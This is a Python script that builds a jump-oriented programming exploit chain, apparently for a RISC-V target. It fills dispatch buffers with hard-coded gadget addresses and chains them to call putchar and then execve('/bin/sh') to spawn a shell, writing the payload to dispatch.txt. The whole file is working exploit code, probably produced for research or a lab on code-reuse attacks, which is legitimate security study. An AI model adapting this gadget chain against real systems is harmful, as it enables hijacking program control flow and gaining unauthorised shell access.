class dispatchBuf():
    def __init__(self, buf_ptr):
        self.buf = [0 for i in range(49)]
        if isinstance(buf_ptr, int):
            self.dispatch_buf = buf_ptr
            self.next_dispatch_buf = buf_ptr + 392
        else:
            self.dispatch_buf = buf_ptr.next_dispatch_buf
            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + 392

        self.set_s3(self.next_dispatch_buf)
    
    def set_t1(self, t1):
        self.buf[22] = t1

    def set_ra(self, ra):
        self.buf[23] = ra

    def set_sp(self, sp):
        self.buf[24] = sp 

    def set_a0(self, a0):
        self.buf[32] = a0

    def set_a1(self, a1):
        self.buf[33] = a1

    def set_a2(self, a2):
        self.buf[34] = a2

    def set_a3(self, a3):
        self.buf[35] = a3
    
    def set_a4(self, a4):
        self.buf[36] = a4

    def set_a5(self, a5):
        self.buf[37] = a5

    def set_a6(self, a6):
        self.buf[38] = a6

    def set_a7(self, a7):
        self.buf[39] = a7

    def set_s0(self, s0):
        self.buf[30] = s0 

    def set_s1(self, s1):
        self.buf[31] = s1 

    def set_s2(self, s2):
        self.buf[40] = s2 

    def set_s3(self, s3):
        self.buf[41] = s3 
    
    def __str__(self):
        return '\n'.join([format(h, 'x') for h in self.buf]) + '\n'

# Pointer values
load_from_t0 = 0x20000648da
set_t0_s3_jump_a3 = 0x200007be24
bin_sh_str = 0x20001178a8
execve = 0x20000ad180
putchar = 0x2000080bcc
mv_a0a1a2_jalr_a5 = 0x2000067010
jalr_a5 = 0x200006701a


dispatch_file = open('dispatch.txt', 'w')

# Initial buffer jumps to a useless gadget for proof-of-concept chaining
buf1 = dispatchBuf(0x20000000)
buf1.set_t1(set_t0_s3_jump_a3)
buf1.set_a3(load_from_t0)
# Initial jump for start_jop.S
buf1.buf[0] = load_from_t0

buf2 = dispatchBuf(buf1)
buf2.set_t1(set_t0_s3_jump_a3)
buf2.set_a3(load_from_t0)

# This buffer jumps to jalr a5 which then goes to putchar
buf3 = dispatchBuf(buf2)
buf3.set_a0(ord('c'))
# Set the stack to the second buf ptr as this shouldn't be used anymore
buf3.set_a3(load_from_t0)
buf3.set_sp(buf2.dispatch_buf)
# Jump to gadget which moves to next dispatcher
buf3.set_ra(set_t0_s3_jump_a3)
buf3.set_t1(putchar)

# This buffer jumps to execve and executes "/bin/sh"
buf4 = dispatchBuf(buf3)
buf4.set_a0(bin_sh_str)
buf4.set_a1(0)
buf4.set_a2(0)
buf4.set_t1(execve)

dispatch_file.write(str(buf1))
dispatch_file.write(str(buf2))
dispatch_file.write(str(buf3))
dispatch_file.write(str(buf4))
# dispatch_file.write(str(buf5))

dispatch_file.close()